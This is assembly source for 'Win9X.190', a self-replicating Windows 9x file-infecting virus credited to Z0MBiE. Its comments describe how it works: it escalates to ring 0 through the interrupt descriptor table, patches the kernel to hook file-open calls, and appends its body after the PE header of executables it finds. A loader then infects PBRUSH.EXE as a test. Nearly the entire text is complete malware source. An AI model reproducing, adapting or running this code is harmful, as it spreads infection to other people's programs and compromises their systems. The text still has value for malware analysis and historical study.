
; ---------------------------------------------------------------------------

; Win9X.190  (c) Z0MBiE  http://z0mbie.cjb.net

; greetz to S.S.R., Vecna, MrSandman, Ultras

;                                 DESCRIPTION
;                                 ~~~~~~~~~~~
; tsr:
;   go ring0 via IDT/int 00h(int, not div),
;   patch kernel,
;   wait PE files on INT21/716C(LFN open)

; version 190 only:
;   files will be opened using i21/AX=3D02, so file can be infected only
;   if passing name is short, or long name looks the same as short name.
;   for example C:\Windows\FILE.exe will be infected,
;   but C:\Program Files\FILE.exe not.

; file infection method:
;   while there is enough free space in the alignment, write virus body right
;   after PE header, each time increasing [size of headers] by 256

; main idea:
;   we assuming that some kernel subroutines are located at fixed addresses
;   and looks as follows: (it works on all tested win9X systems)

; kernel_int21:
; BFF712B9 51           push    ecx          ; 00
; BFF712BA 50           push    eax          ; 01
; BFF712BB 68 002A0010  push    002A0010h    ; 02 03 04 05 06
; BFF712C0 E8 0000010F  call    kernel_ord0  ; 07 08 09 0A 0B (kernel_i21x=8)
; BFF712C5 C3           ret                  ; 0C            (kernel_c1=10Fh)
; kernel_ord0:
; BFF713D4 ..           ...

; ---------------------------------------------------------------------------

kernel_ord0             equ     0BFF713D4h
kernel_int21            equ     0BFF712B9h
kernel_i21x             equ     8
kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))

                        p386
                        model   flat

                        .code
start:
                        xchg    esi, eax                ; ESI = offset start

                        push    edi                     ; EDI <-- LDT.base
                        sidt    [esp-2]
                        pop     edi

                        fild    qword ptr [edi]         ; save desriptor #0

                        call    getr0procaddr          ; to get offset r0proc

                        ; now in ring-0

r0proc:                 fistp   qword ptr [edi-8]       ; restore descr. #0
                        ;;
                        mov     ebx, kernel_int21+kernel_i21x

                        cmp     byte ptr [ebx], kernel_c1 and 255;alredy tsr?
                        jne     r0exit

                        fild    qword ptr [vc1-start+esi];save VxDcall's code

                        push    virtsize                ; size of memory
vc1:                    db      0CDh,20h                ; VxDcall
                        dd      0040000Dh               ; IFSMGR_GetHeap
                        pop     ecx                     ; ECX=virtsize

                        fistp   qword ptr [vc1-start+esi];rest.VxDcall's code

                        xchg    edi, eax                ; EDI = new location
                        rep     movsb                   ; copy virus

                        sub     edi, virtend-hook+4     ; EDI=(offset hook)-4
                        sub     edi, ebx                ;
                        mov     [ebx], edi             ; set new addr to call
                        ;;
r0exit:                 iret                            ; back to ring3

                        ; now in ring-3

hook:                   push    kernel_ord0             ; return address

                        cmp     ax, 716Ch               ; hook it
                        jne     hookexit                ;

infect:                 pusha                           ; save regs

                        mov     ebp, kernel_int21       ; EBP = kernel_int21

                        mov     ax, 3D02h               ; openfile
                        mov     edx, esi
                        call    ebp                     ; int21

                        jc      infect_exit
                        xchg    ebx, eax                ; EBX = file handle

                        mov     esi, [ebp+kernel_i21x]  ; ESI=offset start
                        lea     esi, [esi+ebp-(hook-start-kernel_i21x-4)]

                        xor     ecx, ecx                ; ECX = bufsize
                        mov     ch, bufsize/256

                        lea     edx, [esi+ecx]          ; EDX=offset buf

                        mov     ah, 3Fh                 ; read buffer
                        call    ebp                     ; call ebp/ret

                        mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
                        cmp     ecx, eax                ; EAX = numread
                        jae     infect_close

                        add     ecx, edx               ; ECX=PE header offset

                        cmp     byte ptr [ecx], 'Z'     ; PE header id
                        jne     infect_close

                        mov     eax, [ecx+54h]          ; pe_headersize
                        inc     [ecx+54h].byte ptr 1    ; pe_headersize+=256
                        lea     edi, [edx+eax]  ; EDI=our new location in buf
                        xchg    eax, [ecx+28h]       ; EAX <--> entrypointrva
                        sub     eax, [ecx+28h]         ; calc oldeip (for E9)
                        xor     ecx, ecx
                        mov     cl, physsize           ; ECX = oldeip-start+4
                        sub     eax, ecx        ; EAX = calculated new oldeip

                        pusha

                        xor     eax, eax
                        repz    scasb                   ; should be 0s

                        pushf
                        mov     ah, 42h                 ; AX=4200--seek begin
                        cdq
                        call    ebp                     ; int21
                        popf

                        popa
                        jne     infect_close

                        rep     movsb                   ; copy virus to buf
                        mov     [edi-4], eax            ; store oldeip

                        mov     ah, 40h                 ; write virus
                        mov     ch, bufsize/256         ; ECX = bufsize
                        call    ebp                     ; int21

infect_close:
                        mov     ah, 3Eh                 ; close file
                        call    ebp                     ; int21

infect_exit:            popa                            ; restore regs

hookexit:               ret                           ; return to kernel_ord0

getr0procaddr:          pop     eax                     ; EAX = offset r0proc
                        stosd                           ; +0 WORD offs&0xFFFF
                        stosd                           ; +6 WORD offs>>16
                        mov     [edi-8+2], 0EE000028h   ; +2 DWORD sel./flags

                        int     00h                     ; call ring-0

                        db      0E9h                    ; return to host
oldeip                  dd      loader-$-4              ; entrypointrva

physend:
physsize                equ     $-start

                        org     start+bufsize          ; offset buf==size buf
bufsize                 equ     4096
buf                     db      bufsize dup (0)

virtend:
virtsize                equ     $-start

; --------------------- VIRUS LOADER ----------------------------------------

callW                   macro   x
                        extrn   x:PROC
                        call    x
                        endm

loader:

; testfile --> fullname
                        push    esp
                        push    esp
                        push    offset fullname
                        push    size fullname
                        push    offset testfile
                        callW   GetFullPathNameA
                        pop     ecx

; open/close testfile (so it will be infected)
                        lea     esi, fullname
                        mov     eax, 716Ch
                        xor     ecx, ecx
                        mov     edx, 0001h
                        mov     ebp, kernel_int21
                        call    ebp
                        xchg    ebx, eax
                        mov     ah, 3Eh
                        call    ebp

; deactivate virii (unhook kernel_int21)
                        push    edi
                        sidt    [esp-2]
                        pop     edi
                        fild    qword ptr [edi]
                        call    xxx
                        fistp   qword ptr [edi-8]
                        mov dword ptr ds:[kernel_int21+kernel_i21x],kernel_c1
                        iret
xxx:                    pop     eax
                        stosd
                        stosd
                        mov     [edi-8+2], 0EE000028h
                        int     00h

; write message
                        push    esp
                        push    esp
                        push    msg1_size
                        push    offset msg1
                        push    -11
                        callW   GetStdHandle
                        push    eax
                        callW   WriteConsoleA

; back to md (sucks...)
                        push    -1
                        callW   ExitProcess

                        .data

msg1                    db      'win9X.'
                        db      physsize/ 100 mod 10+'0'
                        db      physsize/  10 mod 10+'0'
                        db      physsize/   1 mod 10+'0'
                        db      ' virii loader executed',13,10
                        db      'þ physsize = '
                        db      physsize/1000 mod 10+'0'
                        db      physsize/ 100 mod 10+'0'
                        db      physsize/  10 mod 10+'0'
                        db      physsize/   1 mod 10+'0'
                        db      ' bytes',13,10
                        db      'þ virtsize = '
                        db      virtsize/1000 mod 10+'0'
                        db      virtsize/ 100 mod 10+'0'
                        db      virtsize/  10 mod 10+'0'
                        db      virtsize/   1 mod 10+'0'
                        db      ' bytes',13,10
                        db      'þ '
testfile                db      'PBRUSH.EXE',0
                        db      'probably infected',13,10
msg1_size               equ     $-msg1

fullname                db      260 dup (?)

                        end     start
